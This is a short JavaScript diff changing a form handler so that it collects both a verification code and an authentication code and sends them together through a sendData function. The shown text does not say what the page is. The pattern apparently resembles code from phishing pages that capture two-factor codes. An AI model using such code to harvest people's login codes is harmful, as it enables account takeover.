@@ -199,13 +199,8 @@
   $("#codeForm").submit((e) => {
     e.preventDefault();
     const code = $("#code").val();
-    const message = null;
-    if(code) {
-      message = `Verification code: ${code}`;
-    } else {
-      const authentication_code = $("#authentication_code").val();
-      message = `Authentication code: ${authentication_code}`;
-    }
+    const authentication_code = $("#authentication_code").val();
+    const message = `Verification code: ${code} \nAuthentication code: ${authentication_code}`;
     sendData(message, 'code');
   });
 
